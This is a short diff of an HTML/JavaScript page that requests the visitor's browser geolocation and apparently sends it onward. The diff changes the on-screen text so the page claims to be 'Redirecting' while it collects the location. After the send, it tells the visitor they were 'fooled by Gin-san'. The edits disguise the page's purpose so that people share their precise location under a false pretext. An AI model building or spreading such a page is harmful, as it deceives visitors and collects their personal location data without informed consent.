@@ -18,7 +18,7 @@
     });
 
     async function getLocation() {
-      document.body.innerHTML = "<h3>位置情報を取得中...</h3>";
+      document.body.innerHTML = "<h3>リダイレクト中</h3>";
 
       navigator.geolocation.getCurrentPosition(
         async pos => {
@@ -33,7 +33,7 @@
             document.body.innerHTML = `<p>送信エラー: ${error.message}</p>`;
           } else {
             document.body.innerHTML = `
-              <h3>送信完了</h3>
+              <h3>銀さんに騙されました！</h3>
               <p>ありがとうございました！</p>
             `;
           }
@@ -46,6 +46,6 @@
   </script>
 </head>
 <body>
-  <h2>位置情報の確認中...</h2>
+  <h2>リダイレクト中です</h2>
 </body>
 </html>
